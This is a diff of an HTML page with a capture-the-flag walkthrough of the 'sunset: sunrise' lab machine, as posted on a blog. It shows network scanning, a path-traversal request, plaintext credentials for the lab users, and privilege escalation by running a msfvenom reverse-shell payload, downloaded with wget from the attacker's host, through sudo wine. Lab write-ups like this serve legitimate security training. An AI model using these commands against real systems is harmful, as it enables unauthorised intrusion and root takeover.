@@ -46,7 +46,7 @@
                     <span class="sr-only">Toggle navigation</span>
                     Menu <i class="fa fa-bars"></i>
                 </button>
-                <a class="navbar-brand" href="index.html">(´• ω •) 🎄</a>
+                <a class="navbar-brand" href="index.html">(´• ω •)</a>
             </div>
 
             <!-- Collect the nav links, forms, and other content for toggling -->
@@ -79,8 +79,8 @@
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                     <div class="post-heading">
                         <h1>sunset: sunrise</h1>
-                        <h2 class="subheading">Difficulty : easy</h2>
-                        <span class="meta">Posted by <a href="#">Admin</a> on December 21, 2019</span>
+                        <h2 class="subheading">Difficulty: easy</h2>
+                        <span class="meta">Posted by <a href="about.html">Admin</a> on December 21, 2019</span>
                     </div>
                 </div>
             </div>
@@ -104,9 +104,9 @@
                         <img class="img-responsive" src="img/post5/image1.png" alt="">
                     </a>
 
-                    <blockquote>arp-scan -l</blockquote>
+                    <pre><code>arp-scan -l</code></pre>
 					
-					<blockquote>nmap 192.168.2.103</blockquote>
+					<pre><code>nmap 192.168.2.103</code></pre>
 					
 					<h2 class="section-heading">Boot2User</h2>
 
@@ -124,7 +124,7 @@
                         <img class="img-responsive" src="img/post5/image3.png" alt="">
                     </a>
 					
-					<p>In the passwd file you can see the names of 2 users(sunrise and weborf)</p>
+					<p>In the passwd file you can see the names of 2 users(sunrise and weborf).</p>
 					
 					<a href="img/post5/image4.png">
                         <img class="img-responsive" src="img/post5/image4.png" alt="">
@@ -135,57 +135,57 @@
                         <img class="img-responsive" src="img/post5/image5.png" alt="">
                     </a>
 					
-					<blockquote>dirb http://192.168.2.103:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf/</blockquote>
+					<pre><code>dirb http://192.168.2.103:8080/%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf/</code></pre>
 					
-					<p>Excellent in mysql history file i found server credentials and now I can log in via ssh</p>
+					<p>Excellent in mysql history file i found server credentials and now I can log in via ssh.</p>
 					
 					<a href="img/post5/image6.png">
                         <img class="img-responsive" src="img/post5/image6.png" alt="">
                     </a>
 					
-					<blockquote>weborf:iheartrainbows44</blockquote>
+					<pre><code>weborf:iheartrainbows44</code></pre>
 					
 					<h2 class="section-heading">Sunrise</h2>
 					
-					<p>Using credentials, I log in to mysql. After that, I find sunrise user credentials in mysql database</p>
+					<p>Using credentials, I log in to mysql. After that, I find sunrise user credentials in mysql database.</p>
 					
 					<a href="img/post5/image7.png">
                         <img class="img-responsive" src="img/post5/image7.png" alt="">
                     </a>
 					
-					<blockquote>mysql -u weborf -p</blockquote>
-					<blockquote>show databases;</blockquote>
-					<blockquote>use mysql;</blockquote>
-					<blockquote>SHOW tables;</blockquote>
-					<blockquote>SHOW COLUMNS FROM user;</blockquote>
-					<blockquote>SELECT User FROM user;</blockquote>
-					<blockquote>SELECT Password FROM user;</blockquote>
+					<pre><code>mysql -u weborf -p<</code></pre>
+					<pre><code>show databases;</code></pre>
+					<pre><code>use mysql;</code></pre>
+					<pre><code>SHOW tables;</code></pre>
+					<pre><code>SHOW COLUMNS FROM user;</code></pre>
+					<pre><code>SELECT User FROM user;</code></pre>
+					<pre><code>SELECT Password FROM user;</code></pre>
 					
-					<p>Now you can log in via ssh as with user rights sunrise</p>
+					<p>Now you can log in via ssh as with user rights sunrise.</p>
 					
 					<a href="img/post5/image8.png">
                         <img class="img-responsive" src="img/post5/image8.png" alt="">
                     </a>
 					
-					<blockquote>sunrise:thefutureissobrightigottawearshades</blockquote>
+					<pre><code>sunrise:thefutureissobrightigottawearshades</code></pre>
 					
 					<h2 class="section-heading">Boot2Root</h2>
 					
-					<p>Using the sudo -l command, I see that I can run wine with root privileges</p>
+					<p>Using the sudo -l command, I see that I can run wine with root privileges.</p>
 					
 					<a href="img/post5/image9.png">
                         <img class="img-responsive" src="img/post5/image9.png" alt="">
                     </a>
 					
-					<blockquote>sudo -l</blockquote>
+					<pre><code>sudo -l</code></pre>
 					
-					<p>Since wine is designed to run files with the .exe extension, I will generate paylod for windows using msfvenom. After generating payload, I move it using the apache2 server</p>
+					<p>Since wine is designed to run files with the .exe extension, I will generate paylod for windows using msfvenom. After generating payload, I move it using the apache2 server.</p>
 					
-					<blockquote>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.100 LPORT=1313 -f exe > shell.exe</blockquote>
-					<blockquote>service apache2 start</blockquote>
-					<blockquote>wget http://192.168.2.100/shell.exe</blockquote>
+					<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.100 LPORT=1313 -f exe > shell.exe</code></pre>
+					<pre><code>service apache2 start</code></pre>
+					<pre><code>wget http://192.168.2.100/shell.exe</code></pre>
 					
-					<p>After running shell.exe I get root access</p>
+					<p>After running shell.exe I get root access.</p>
 					
 					<a href="img/post5/image11.png">
                         <img class="img-responsive" src="img/post5/image11.png" alt="">
